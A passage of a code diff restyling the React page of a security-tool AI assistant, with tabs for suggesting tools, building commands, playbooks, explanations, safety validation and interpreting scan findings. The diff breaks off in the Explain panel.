@@ -1,17 +1,32 @@
 /**
- * CyberSec Pro AI Assistant — Intelligent Security Co-Pilot
+ * CyberSec Pro AI Assistant — Intelligent Security Co-Pilot.
  *
- * Five capabilities:
- *   1. Tool Suggester    — "What should I use for X?"
- *   2. Command Builder   — Build a safe command for a tool/target
- *   3. Playbook          — Multi-step workflow (recon → exploit → report)
- *   4. Explain           — Plain-English explanation of any tool / command
- *   5. Validate          — Static safety analysis of a command
- *   6. Interpret         — Summarize scan findings (paste JSON or pull from scan)
+ * Vos-design migration. Six capabilities surfaced as tabbed panels:
+ *   1. Suggest    — "Which tool should I use for X?"
+ *   2. Playbook   — Multi-step workflow (recon → exploit → report)
+ *   3. Command    — Build a safe command for a tool/target
+ *   4. Explain    — Plain-English explanation of any tool/command
+ *   5. Validate   — Static safety analysis of a command
+ *   6. Interpret  — Summarise scan findings (paste JSON)
  */
 import { useState } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { useTranslation } from 'react-i18next';
+import {
+  Bot,
+  Target,
+  Workflow,
+  Zap,
+  Lightbulb,
+  ShieldCheck,
+  BarChart3,
+  Sparkles,
+  AlertTriangle,
+  AlertOctagon,
+  Check,
+  Terminal,
+} from 'lucide-react';
+
 import { useDocumentTitle } from '../../hooks/useUtilities';
 import { PageTransition } from '../../components/ui';
 import {
@@ -22,9 +37,15 @@ import {
   useAIValidateCommand,
   useAIInterpretResults,
 } from '../../hooks/useApiQueries';
+import {
+  PageHeader,
+  Section,
+  StatusPill,
+  KeyValueGrid,
+} from '../../components/vos/Soc';
 
-// ───── Types ─────
-type Tab = 'suggest' | 'command' | 'playbook' | 'explain' | 'validate' | 'interpret';
+// ───── Types ─────────────────────────────────────────────────────────────
+type Tab = 'suggest' | 'playbook' | 'command' | 'explain' | 'validate' | 'interpret';
 
 interface ToolSuggestion {
   id: string;
@@ -43,27 +64,32 @@ interface SafetyResult {
   verdict: 'ok' | 'review' | 'blocked';
 }
 
-const TABS: Array<{ id: Tab; label: string; icon: string; desc: string }> = [
-  { id: 'suggest',   label: 'Suggest Tools', icon: '🎯', desc: 'Which tool fits my goal?' },
-  { id: 'playbook',  label: 'Playbook',      icon: '📋', desc: 'Multi-step workflow' },
-  { id: 'command',   label: 'Build Command', icon: '⚡', desc: 'Safe command for target' },
-  { id: 'explain',   label: 'Explain',       icon: '💡', desc: 'How does this work?' },
-  { id: 'validate',  label: 'Validate',      icon: '🛡️', desc: 'Safety check a command' },
-  { id: 'interpret', label: 'Interpret',     icon: '📊', desc: 'Summarize findings' },
+const TABS: Array<{ id: Tab; label: string; icon: typeof Bot; desc: string }> = [
+  { id: 'suggest',   label: 'Suggest Tools', icon: Target,      desc: 'Which tool fits my goal?' },
+  { id: 'playbook',  label: 'Playbook',      icon: Workflow,    desc: 'Multi-step workflow' },
+  { id: 'command',   label: 'Build Command', icon: Zap,         desc: 'Safe command for target' },
+  { id: 'explain',   label: 'Explain',       icon: Lightbulb,   desc: 'How does this work?' },
+  { id: 'validate',  label: 'Validate',      icon: ShieldCheck, desc: 'Safety check a command' },
+  { id: 'interpret', label: 'Interpret',     icon: BarChart3,   desc: 'Summarise findings' },
 ];
 
-const DANGER_BADGE: Record<number, { label: string; color: string }> = {
-  0: { label: 'Safe', color: 'bg-green-500/20 text-green-400 border-green-500/30' },
-  1: { label: 'Intrusive', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30' },
-  2: { label: 'Destructive', color: 'bg-red-500/20 text-red-400 border-red-500/30' },
+const DANGER_TONE: Record<number, 'success' | 'warning' | 'danger'> = {
+  0: 'success', 1: 'warning', 2: 'danger',
+};
+const DANGER_LABEL: Record<number, string> = {
+  0: 'Safe', 1: 'Intrusive', 2: 'Destructive',
 };
 
-const VERDICT_BADGE: Record<string, { label: string; color: string; icon: string }> = {
-  ok:      { label: 'Safe to run',    color: 'bg-green-500/20 text-green-400',  icon: '✓' },
-  review:  { label: 'Review needed',  color: 'bg-yellow-500/20 text-yellow-400', icon: '⚠' },
-  blocked: { label: 'Blocked',        color: 'bg-red-500/20 text-red-400',      icon: '⛔' },
+const VERDICT_TONE: Record<string, 'success' | 'warning' | 'danger'> = {
+  ok: 'success', review: 'warning', blocked: 'danger',
+};
+const VERDICT_LABEL: Record<string, string> = {
+  ok: 'Safe to run', review: 'Review needed', blocked: 'Blocked',
 };
 
+// ─────────────────────────────────────────────────────────────────────────
+// Page
+// ─────────────────────────────────────────────────────────────────────────
 export default function AIAssistantPage() {
   const { t } = useTranslation();
   useDocumentTitle(`${t('aiAssistant.title', 'AI Assistant')} — CyberSec Pro`);
@@ -73,76 +99,164 @@ export default function AIAssistantPage() {
 
   return (
     <PageTransition>
-      <div className="p-6 space-y-6 max-w-7xl mx-auto">
-        {/* Header */}
-        <div className="flex items-start justify-between gap-4 flex-wrap">
-          <div>
-            <h1 className="text-3xl font-bold text-white flex items-center gap-3">
-              <span className="text-4xl">🤖</span>
-              CyberSec Pro AI
-              <span className="px-2 py-0.5 text-xs font-semibold bg-cyan-500/20 text-cyan-400 rounded-full border border-cyan-500/30">
-                Intelligent Co-Pilot
-              </span>
-            </h1>
-            <p className="text-gray-400 mt-2 max-w-2xl">
-              Your security expert. Ask what tool to use, build safe commands, design multi-step
-              playbooks, validate dangerous commands, and let AI interpret your scan findings.
-            </p>
-          </div>
-          <label className="flex items-center gap-2 px-3 py-2 bg-gray-800 border border-gray-700 rounded-lg text-sm cursor-pointer hover:border-cyan-500 transition">
-            <input type="checkbox" checked={useLLM} onChange={e => setUseLLM(e.target.checked)} className="w-4 h-4 accent-cyan-500" />
-            <span className="text-gray-300">LLM enrichment</span>
-            <span className="text-xs text-gray-500">(slower, smarter)</span>
-          </label>
-        </div>
+      <div className="p-vos-6 max-w-vos-page mx-auto space-y-vos-6">
+        <PageHeader
+          icon={Bot}
+          title="CyberSec Pro AI"
+          subtitle="Your security expert. Ask what tool to use, build safe commands, design multi-step playbooks, validate dangerous commands, and let AI interpret your scan findings."
+          badge={<StatusPill tone="accent" label="Intelligent Co-Pilot" />}
+          actions={
+            <label className="flex items-center gap-2 h-9 px-vos-3 rounded-vos-md bg-vos-bg-elev-1 border border-vos-border-1 text-vos-sm text-vos-text-2 cursor-pointer hover:border-vos-accent/40 transition-colors">
+              <input
+                type="checkbox"
+                checked={useLLM}
+                onChange={(e) => setUseLLM(e.target.checked)}
+                className="w-3.5 h-3.5 accent-vos-accent"
+              />
+              <Sparkles size={13} className="text-vos-accent" />
+              LLM enrichment
+              <span className="text-[11px] text-vos-text-3">(slower, smarter)</span>
+            </label>
+          }
+        />
 
-        {/* Tabs */}
-        <div className="flex flex-wrap gap-2">
-          {TABS.map(tabItem => (
-            <button
-              key={tabItem.id}
-              onClick={() => setTab(tabItem.id)}
-              className={`group relative px-4 py-3 rounded-xl border transition-all ${
-                tab === tabItem.id
-                  ? 'bg-cyan-500/10 border-cyan-500/50 text-cyan-300'
-                  : 'bg-gray-800/50 border-gray-700 text-gray-400 hover:border-gray-600 hover:text-gray-200'
-              }`}
-            >
-              <div className="flex items-center gap-2">
-                <span className="text-lg">{tabItem.icon}</span>
-                <div className="text-left">
-                  <div className="font-medium text-sm">{tabItem.label}</div>
-                  <div className="text-xs opacity-70">{tabItem.desc}</div>
+        {/* Tab grid */}
+        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-vos-2">
+          {TABS.map((it) => {
+            const active = tab === it.id;
+            const Icon = it.icon;
+            return (
+              <button
+                key={it.id}
+                onClick={() => setTab(it.id)}
+                className={`group flex items-start gap-vos-2 p-vos-3 rounded-vos-md border transition-colors text-left ${
+                  active
+                    ? 'bg-vos-accent/10 border-vos-accent/40 text-vos-accent ring-1 ring-vos-accent/30'
+                    : 'bg-vos-bg-elev-1 border-vos-border-1 text-vos-text-2 hover:border-vos-border-2 hover:text-vos-text'
+                }`}
+              >
+                <Icon size={16} className="mt-0.5 shrink-0" />
+                <div className="min-w-0">
+                  <div className="font-medium text-vos-sm">{it.label}</div>
+                  <div className={`text-[11px] truncate ${active ? 'text-vos-accent/80' : 'text-vos-text-3'}`}>{it.desc}</div>
                 </div>
-              </div>
-            </button>
-          ))}
+              </button>
+            );
+          })}
         </div>
 
-        {/* Active panel */}
-        <div className="bg-gray-800/40 border border-gray-700 rounded-2xl p-6 min-h-[400px]">
+        <Section bodyClassName="min-h-[400px]" title={TABS.find((x) => x.id === tab)?.label ?? ''}>
           <AnimatePresence mode="wait">
-            <motion.div key={tab} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
+            <motion.div
+              key={tab}
+              initial={{ opacity: 0, y: 8 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0 }}
+              transition={{ duration: 0.18 }}
+            >
               {tab === 'suggest'   && <SuggestPanel useLLM={useLLM} />}
-              {tab === 'command'   && <CommandPanel useLLM={useLLM} />}
               {tab === 'playbook'  && <PlaybookPanel useLLM={useLLM} />}
+              {tab === 'command'   && <CommandPanel />}
               {tab === 'explain'   && <ExplainPanel useLLM={useLLM} />}
               {tab === 'validate'  && <ValidatePanel />}
               {tab === 'interpret' && <InterpretPanel useLLM={useLLM} />}
             </motion.div>
           </AnimatePresence>
-        </div>
+        </Section>
       </div>
     </PageTransition>
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
+// Reusable form primitives (vos-styled)
+// ─────────────────────────────────────────────────────────────────────────
+function VosLabel({ children }: { children: React.ReactNode }) {
+  return (
+    <label className="block text-[10px] uppercase tracking-vos-wide font-semibold text-vos-text-3 mb-1.5">
+      {children}
+    </label>
+  );
+}
+
+function VosInput(props: React.InputHTMLAttributes<HTMLInputElement>) {
+  return (
+    <input
+      {...props}
+      className={`w-full h-9 px-vos-3 rounded-vos-md bg-vos-bg-elev-3 border border-vos-border-1 text-vos-sm text-vos-text placeholder:text-vos-text-muted focus:outline-none focus:border-vos-accent focus:ring-2 focus:ring-vos-accent/30 transition-colors ${props.className ?? ''}`}
+    />
+  );
+}
+
+function VosTextarea(props: React.TextareaHTMLAttributes<HTMLTextAreaElement>) {
+  return (
+    <textarea
+      {...props}
+      className={`w-full px-vos-3 py-vos-2 rounded-vos-md bg-vos-bg-elev-3 border border-vos-border-1 text-vos-sm text-vos-text placeholder:text-vos-text-muted focus:outline-none focus:border-vos-accent focus:ring-2 focus:ring-vos-accent/30 transition-colors resize-y font-vos-sans ${props.className ?? ''}`}
+    />
+  );
+}
+
+function VosSelect(props: React.SelectHTMLAttributes<HTMLSelectElement>) {
+  return (
+    <select
+      {...props}
+      className={`h-9 px-vos-3 rounded-vos-md bg-vos-bg-elev-3 border border-vos-border-1 text-vos-sm text-vos-text focus:outline-none focus:border-vos-accent focus:ring-2 focus:ring-vos-accent/30 transition-colors ${props.className ?? ''}`}
+    />
+  );
+}
+
+function PrimaryButton({
+  children, disabled, onClick, icon: Icon,
+}: { children: React.ReactNode; disabled?: boolean; onClick?: () => void; icon?: typeof Bot }) {
+  return (
+    <button
+      onClick={onClick}
+      disabled={disabled}
+      className="inline-flex items-center gap-1.5 h-9 px-vos-4 rounded-vos-md bg-vos-accent text-white text-vos-sm font-semibold hover:bg-vos-accent/90 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
+    >
+      {Icon && <Icon size={14} />}
+      {children}
+    </button>
+  );
+}
+
+function ChipButton({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
+  return (
+    <button
+      onClick={onClick}
+      className="inline-flex items-center px-2.5 h-7 rounded-vos-sm bg-vos-bg-elev-2 text-vos-text-3 text-vos-xs border border-vos-border-1 hover:border-vos-border-2 hover:text-vos-text-2 transition-colors"
+    >
+      {children}
+    </button>
+  );
+}
+
+function CodeBlock({ children, className }: { children: React.ReactNode; className?: string }) {
+  return (
+    <code
+      className={`block text-vos-xs bg-vos-bg-elev-3 text-vos-success px-vos-3 py-vos-2 rounded-vos-md border border-vos-border-1 overflow-x-auto whitespace-nowrap font-vos-mono ${className ?? ''}`}
+    >
+      {children}
+    </code>
+  );
+}
+
+function AICallout({ title, children }: { title: string; children: React.ReactNode }) {
+  return (
+    <div className="p-vos-3 rounded-vos-md bg-vos-accent/5 border border-vos-accent/20">
+      <div className="text-[10px] uppercase tracking-vos-wide font-semibold text-vos-accent mb-1">{title}</div>
+      <div className="text-vos-sm text-vos-text-2 whitespace-pre-wrap leading-relaxed">{children}</div>
+    </div>
+  );
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 // Panel: Suggest Tools
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 function SuggestPanel({ useLLM }: { useLLM: boolean }) {
   const [query, setQuery] = useState('');
-  const [targetType, setTargetType] = useState<string>('');
+  const [targetType, setTargetType] = useState('');
   const mut = useAISuggestTools();
   const result = mut.data as { suggestions?: ToolSuggestion[]; explanation?: string; source?: string } | undefined;
 
@@ -161,23 +275,22 @@ function SuggestPanel({ useLLM }: { useLLM: boolean }) {
   };
 
   return (
-    <div className="space-y-4">
+    <div className="space-y-vos-4">
       <div>
-        <label className="block text-sm text-gray-300 mb-2">What do you want to do?</label>
-        <textarea
+        <VosLabel>What do you want to do?</VosLabel>
+        <VosTextarea
           value={query}
-          onChange={e => setQuery(e.target.value)}
-          onKeyDown={e => e.key === 'Enter' && e.ctrlKey && submit()}
-          placeholder="e.g. I want to find SQL injection vulnerabilities in a login form..."
+          onChange={(e) => setQuery(e.target.value)}
+          onKeyDown={(e) => e.key === 'Enter' && e.ctrlKey && submit()}
+          placeholder="e.g. I want to find SQL injection vulnerabilities in a login form…"
           rows={3}
-          className="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-lg text-white text-sm focus:outline-none focus:border-cyan-500 resize-none"
         />
       </div>
 
-      <div className="flex flex-wrap items-end gap-3">
+      <div className="flex flex-wrap items-end gap-vos-3">
         <div>
-          <label className="block text-xs text-gray-400 mb-1">Target type (optional)</label>
-          <select value={targetType} onChange={e => setTargetType(e.target.value)} className="px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200">
+          <VosLabel>Target type (optional)</VosLabel>
+          <VosSelect value={targetType} onChange={(e) => setTargetType(e.target.value)}>
             <option value="">Any</option>
             <option value="url">URL</option>
             <option value="domain">Domain</option>
@@ -185,112 +298,108 @@ function SuggestPanel({ useLLM }: { useLLM: boolean }) {
             <option value="repository">Git repo</option>
             <option value="image">Container image</option>
             <option value="file">File</option>
-          </select>
+          </VosSelect>
         </div>
-        <button
-          onClick={submit}
-          disabled={mut.isPending || !query.trim()}
-          className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm transition"
-        >
-          {mut.isPending ? 'Thinking…' : '🎯 Suggest Tools'}
-        </button>
-        <span className="text-xs text-gray-500">Ctrl+Enter to submit</span>
+        <PrimaryButton onClick={submit} disabled={mut.isPending || !query.trim()} icon={Target}>
+          {mut.isPending ? 'Thinking…' : 'Suggest Tools'}
+        </PrimaryButton>
+        <span className="text-vos-xs text-vos-text-3">Ctrl+Enter to submit</span>
       </div>
 
-      <div className="flex flex-wrap gap-2">
-        {examples.map(ex => (
-          <button key={ex} onClick={() => setQuery(ex)} className="px-2.5 py-1 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-full text-gray-400">
-            {ex}
-          </button>
+      <div className="flex flex-wrap gap-vos-2">
+        {examples.map((ex) => (
+          <ChipButton key={ex} onClick={() => setQuery(ex)}>{ex}</ChipButton>
         ))}
       </div>
 
       {result?.explanation && (
-        <div className="p-4 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
-          <div className="text-xs text-cyan-400 mb-1 font-semibold uppercase">AI Analysis ({result.source})</div>
-          <p className="text-gray-300 text-sm leading-relaxed">{result.explanation}</p>
-        </div>
+        <AICallout title={`AI Analysis · ${result.source ?? 'engine'}`}>{result.explanation}</AICallout>
       )}
 
       {result?.suggestions && result.suggestions.length > 0 ? (
-        <div className="grid md:grid-cols-2 gap-3 mt-4">
-          {result.suggestions.map(tool => (
-            <div key={tool.id} className="p-4 bg-gray-900/60 border border-gray-700 rounded-lg hover:border-cyan-500/50 transition">
-              <div className="flex items-start justify-between gap-2 mb-2">
+        <div className="grid md:grid-cols-2 gap-vos-3">
+          {result.suggestions.map((tool) => (
+            <div
+              key={tool.id}
+              className="p-vos-4 rounded-vos-lg bg-vos-bg-elev-1 border border-vos-border-1 hover:border-vos-accent/30 transition-colors"
+            >
+              <div className="flex items-start justify-between gap-2 mb-vos-2">
                 <div>
-                  <div className="font-bold text-white">{tool.name}</div>
-                  <div className="text-xs text-gray-500">{tool.category}</div>
+                  <div className="font-semibold text-vos-text">{tool.name}</div>
+                  <div className="text-vos-xs text-vos-text-3">{tool.category}</div>
                 </div>
-                <span className={`px-2 py-0.5 text-xs rounded border ${DANGER_BADGE[tool.danger_level]?.color}`}>
-                  {DANGER_BADGE[tool.danger_level]?.label}
-                </span>
+                <StatusPill
+                  tone={DANGER_TONE[tool.danger_level] ?? 'neutral'}
+                  label={DANGER_LABEL[tool.danger_level] ?? '—'}
+                />
               </div>
-              <div className="text-xs text-gray-400 mb-2">
-                <span className="text-gray-500">Best for:</span> {tool.use_cases.slice(0, 3).join(' • ')}
+              <div className="text-vos-xs text-vos-text-3 mb-vos-2">
+                <span className="text-vos-text-muted">Best for: </span>
+                {tool.use_cases.slice(0, 3).join(' • ')}
               </div>
-              <div className="text-xs text-gray-500 mb-1">Example:</div>
-              <code className="block text-xs bg-gray-950 text-green-400 px-2 py-1.5 rounded border border-gray-800 overflow-x-auto whitespace-nowrap">
-                {tool.example_command}
-              </code>
-              <div className="flex gap-1 mt-2 flex-wrap">
-                {tool.target_types.map(tt => (
-                  <span key={tt} className="px-1.5 py-0.5 text-[10px] bg-gray-800 text-gray-400 rounded">{tt}</span>
+              <div className="text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">Example</div>
+              <CodeBlock>{tool.example_command}</CodeBlock>
+              <div className="flex flex-wrap gap-1 mt-vos-2">
+                {tool.target_types.map((tt) => (
+                  <span
+                    key={tt}
+                    className="px-1.5 py-0.5 text-[10px] rounded-vos-sm bg-vos-bg-elev-2 border border-vos-border-1 text-vos-text-3"
+                  >
+                    {tt}
+                  </span>
                 ))}
               </div>
             </div>
           ))}
         </div>
       ) : mut.isSuccess ? (
-        <p className="text-gray-500 text-sm italic mt-4">No matching tools — try rephrasing your goal.</p>
+        <p className="text-vos-text-3 text-vos-sm italic">No matching tools — try rephrasing your goal.</p>
       ) : null}
     </div>
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 // Panel: Command Builder
-// ═══════════════════════════════════════════════════════════
-function CommandPanel({ useLLM: _ }: { useLLM: boolean }) {
+// ─────────────────────────────────────────────────────────────────────────
+function CommandPanel() {
   const [toolId, setToolId] = useState('nmap');
   const [target, setTarget] = useState('');
   const mut = useAIGenerateCommand();
   const r = mut.data as { command?: string; safety?: SafetyResult; tool?: ToolSuggestion } | undefined;
 
   const TOOL_OPTIONS = [
-    'nmap','masscan','nikto','nuclei','wpscan','sqlmap','gobuster','ffuf','subfinder',
-    'amass','httpx','sslscan','testssl','hydra','metasploit','zap','trivy','gitleaks','trufflehog',
+    'nmap', 'masscan', 'nikto', 'nuclei', 'wpscan', 'sqlmap', 'gobuster', 'ffuf', 'subfinder',
+    'amass', 'httpx', 'sslscan', 'testssl', 'hydra', 'metasploit', 'zap', 'trivy', 'gitleaks', 'trufflehog',
   ];
 
   return (
-    <div className="space-y-4">
-      <div className="grid md:grid-cols-2 gap-3">
+    <div className="space-y-vos-4">
+      <div className="grid md:grid-cols-2 gap-vos-3">
         <div>
-          <label className="block text-sm text-gray-300 mb-1">Tool</label>
-          <select value={toolId} onChange={e => setToolId(e.target.value)} className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200">
-            {TOOL_OPTIONS.map(t => <option key={t} value={t}>{t}</option>)}
-          </select>
+          <VosLabel>Tool</VosLabel>
+          <VosSelect value={toolId} onChange={(e) => setToolId(e.target.value)} className="w-full">
+            {TOOL_OPTIONS.map((t) => <option key={t} value={t}>{t}</option>)}
+          </VosSelect>
         </div>
         <div>
-          <label className="block text-sm text-gray-300 mb-1">Target</label>
-          <input value={target} onChange={e => setTarget(e.target.value)} placeholder="example.com or 192.168.1.0/24"
-            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200" />
+          <VosLabel>Target</VosLabel>
+          <VosInput value={target} onChange={(e) => setTarget(e.target.value)} placeholder="example.com or 192.168.1.0/24" />
         </div>
       </div>
-      <button
+      <PrimaryButton
         disabled={!target.trim() || mut.isPending}
         onClick={() => mut.mutate({ tool_id: toolId, target: target.trim() })}
-        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
+        icon={Zap}
       >
-        {mut.isPending ? 'Building…' : '⚡ Build Command'}
-      </button>
+        {mut.isPending ? 'Building…' : 'Build Command'}
+      </PrimaryButton>
 
       {r?.command && (
-        <div className="space-y-3">
+        <div className="space-y-vos-3">
           <div>
-            <div className="text-xs text-gray-400 mb-1">Generated command:</div>
-            <code className="block text-sm bg-gray-950 text-green-400 px-3 py-2 rounded border border-gray-800 overflow-x-auto">
-              {r.command}
-            </code>
+            <div className="text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">Generated command</div>
+            <CodeBlock className="whitespace-pre-wrap break-words">{r.command}</CodeBlock>
           </div>
           {r.safety && <SafetyCard safety={r.safety} />}
         </div>
@@ -299,62 +408,62 @@ function CommandPanel({ useLLM: _ }: { useLLM: boolean }) {
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 // Panel: Playbook
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 function PlaybookPanel({ useLLM }: { useLLM: boolean }) {
   const [goal, setGoal] = useState('');
   const [target, setTarget] = useState('');
   const mut = useAIPlaybook();
-  const r = mut.data as { steps?: Array<{ order: number; tool: string; purpose: string; command: string }>; rationale?: string } | undefined;
+  const r = mut.data as
+    | { steps?: Array<{ order: number; tool: string; purpose: string; command: string }>; rationale?: string }
+    | undefined;
 
   const presets = ['Bug bounty recon', 'WordPress audit', 'Internal network pentest', 'SSL/TLS audit', 'API security test', 'Find leaked secrets'];
 
   return (
-    <div className="space-y-4">
-      <div className="grid md:grid-cols-2 gap-3">
+    <div className="space-y-vos-4">
+      <div className="grid md:grid-cols-2 gap-vos-3">
         <div>
-          <label className="block text-sm text-gray-300 mb-1">Goal</label>
-          <input value={goal} onChange={e => setGoal(e.target.value)} placeholder="e.g. Bug bounty recon"
-            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200" />
+          <VosLabel>Goal</VosLabel>
+          <VosInput value={goal} onChange={(e) => setGoal(e.target.value)} placeholder="e.g. Bug bounty recon" />
         </div>
         <div>
-          <label className="block text-sm text-gray-300 mb-1">Target</label>
-          <input value={target} onChange={e => setTarget(e.target.value)} placeholder="example.com"
-            className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200" />
+          <VosLabel>Target</VosLabel>
+          <VosInput value={target} onChange={(e) => setTarget(e.target.value)} placeholder="example.com" />
         </div>
       </div>
-      <div className="flex flex-wrap gap-2">
-        {presets.map(p => (
-          <button key={p} onClick={() => setGoal(p)} className="px-2.5 py-1 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-700 rounded-full text-gray-400">{p}</button>
+      <div className="flex flex-wrap gap-vos-2">
+        {presets.map((p) => (
+          <ChipButton key={p} onClick={() => setGoal(p)}>{p}</ChipButton>
         ))}
       </div>
-      <button
+      <PrimaryButton
         disabled={!goal.trim() || !target.trim() || mut.isPending}
         onClick={() => mut.mutate({ goal: goal.trim(), target: target.trim(), use_llm: useLLM })}
-        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
+        icon={Workflow}
       >
-        {mut.isPending ? 'Designing…' : '📋 Generate Playbook'}
-      </button>
+        {mut.isPending ? 'Designing…' : 'Generate Playbook'}
+      </PrimaryButton>
 
-      {r?.rationale && (
-        <div className="p-3 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
-          <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Why this order</div>
-          <p className="text-sm text-gray-300">{r.rationale}</p>
-        </div>
-      )}
+      {r?.rationale && <AICallout title="Why this order">{r.rationale}</AICallout>}
 
       {r?.steps && r.steps.length > 0 && (
-        <ol className="space-y-2">
-          {r.steps.map(step => (
-            <li key={step.order} className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg flex gap-3">
-              <div className="flex-shrink-0 w-8 h-8 bg-cyan-500/20 text-cyan-400 rounded-full flex items-center justify-center font-bold">{step.order}</div>
+        <ol className="space-y-vos-2">
+          {r.steps.map((step) => (
+            <li
+              key={step.order}
+              className="p-vos-3 bg-vos-bg-elev-1 border border-vos-border-1 rounded-vos-md flex gap-vos-3"
+            >
+              <div className="shrink-0 w-8 h-8 bg-vos-accent/15 text-vos-accent rounded-full flex items-center justify-center font-bold text-vos-sm">
+                {step.order}
+              </div>
               <div className="flex-1 min-w-0">
-                <div className="flex items-baseline justify-between gap-2">
-                  <span className="font-semibold text-white">{step.tool}</span>
-                  <span className="text-xs text-gray-500">{step.purpose}</span>
+                <div className="flex items-baseline justify-between gap-2 flex-wrap">
+                  <span className="font-semibold text-vos-text">{step.tool}</span>
+                  <span className="text-vos-xs text-vos-text-3">{step.purpose}</span>
                 </div>
-                <code className="block mt-1 text-xs bg-gray-950 text-green-400 px-2 py-1 rounded overflow-x-auto whitespace-nowrap">{step.command}</code>
+                <CodeBlock className="mt-1">{step.command}</CodeBlock>
               </div>
             </li>
           ))}
@@ -364,14 +473,16 @@ function PlaybookPanel({ useLLM }: { useLLM: boolean }) {
   );
 }
 
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 // Panel: Explain
-// ═══════════════════════════════════════════════════════════
+// ─────────────────────────────────────────────────────────────────────────
 function ExplainPanel({ useLLM }: { useLLM: boolean }) {
   const [mode, setMode] = useState<'tool' | 'command'>('tool');
   const [val, setVal] = useState('');
   const mut = useAIExplain();
-  const r = mut.data as { summary?: string; explanation?: string; deep_explanation?: string; tool?: ToolSuggestion; safety?: SafetyResult } | undefined;
+  const r = mut.data as
+    | { summary?: string; explanation?: string; deep_explanation?: string; tool?: ToolSuggestion; safety?: SafetyResult }
+    | undefined;
 
   const submit = () => {
     if (!val.trim()) return;
@@ -379,52 +490,49 @@ function ExplainPanel({ useLLM }: { useLLM: boolean }) {
   };
 
   return (
-    <div className="space-y-4">
-      <div className="flex gap-2">
-        <button onClick={() => setMode('tool')} className={`px-3 py-1.5 rounded-lg text-sm ${mode === 'tool' ? 'bg-cyan-500/20 text-cyan-300' : 'bg-gray-800 text-gray-400'}`}>Tool</button>
-        <button onClick={() => setMode('command')} className={`px-3 py-1.5 rounded-lg text-sm ${mode === 'command' ? 'bg-cyan-500/20 text-cyan-300' : 'bg-gray-800 text-gray-400'}`}>Command</button>
+    <div className="space-y-vos-4">
+      <div className="flex gap-vos-2">
+        {(['tool', 'command'] as const).map((m) => (
+          <button
+            key={m}
+            onClick={() => setMode(m)}
+            className={`px-3 h-8 rounded-vos-md text-vos-sm font-medium transition-colors capitalize ${
+              mode === m
+                ? 'bg-vos-accent/10 text-vos-accent ring-1 ring-vos-accent/30'
+                : 'bg-vos-bg-elev-2 text-vos-text-3 border border-vos-border-1 hover:text-vos-text-2'
+            }`}
+          >
+            {m}
+          </button>
+        ))}
       </div>
-      <input
+      <VosInput
         value={val}
-        onChange={e => setVal(e.target.value)}
-        onKeyDown={e => e.key === 'Enter' && submit()}
+        onChange={(e) => setVal(e.target.value)}
+        onKeyDown={(e) => e.key === 'Enter' && submit()}
         placeholder={mode === 'tool' ? 'e.g. nmap, sqlmap, nuclei…' : 'e.g. nmap -sV -A scanme.nmap.org'}
-        className="w-full px-3 py-2 bg-gray-900 border border-gray-700 rounded-lg text-sm text-gray-200 font-mono"
+        className="font-vos-mono"
       />
-      <button
-        disabled={!val.trim() || mut.isPending}
-        onClick={submit}
-        className="px-5 py-2 bg-cyan-600 hover:bg-cyan-500 disabled:bg-gray-700 text-white rounded-lg font-medium text-sm"
-      >
-        {mut.isPending ? 'Explaining…' : '💡 Explain'}
-      </button>
+      <PrimaryButton disabled={!val.trim() || mut.isPending} onClick={submit} icon={Lightbulb}>
+        {mut.isPending ? 'Explaining…' : 'Explain'}
+      </PrimaryButton>
 
       {r?.summary && (
-        <div className="p-3 bg-gray-900/60 border border-gray-700 rounded-lg">
-          <div className="text-xs text-gray-500 mb-1">Quick summary</div>
-          <p className="text-sm text-gray-200">{r.summary}</p>
+        <div className="p-vos-3 rounded-vos-md bg-vos-bg-elev-1 border border-vos-border-1">
+          <div className="text-[10px] uppercase tracking-vos-wide text-vos-text-3 mb-1">Quick summary</div>
+          <p className="text-vos-sm text-vos-text-2">{r.summary}</p>
         </div>
       )}
-      {r?.explanation && (
-        <div className="p-3 bg-cyan-500/5 border border-cyan-500/20 rounded-lg">
-          <div className="text-xs text-cyan-400 font-semibold uppercase mb-1">Explanation</div>
-          <p className="text-sm text-gray-300 whitespace-pre-wrap leading-relaxed">{r.explanation}</p>
-        </div>
-      )}
-      {r?.deep_explanation && (
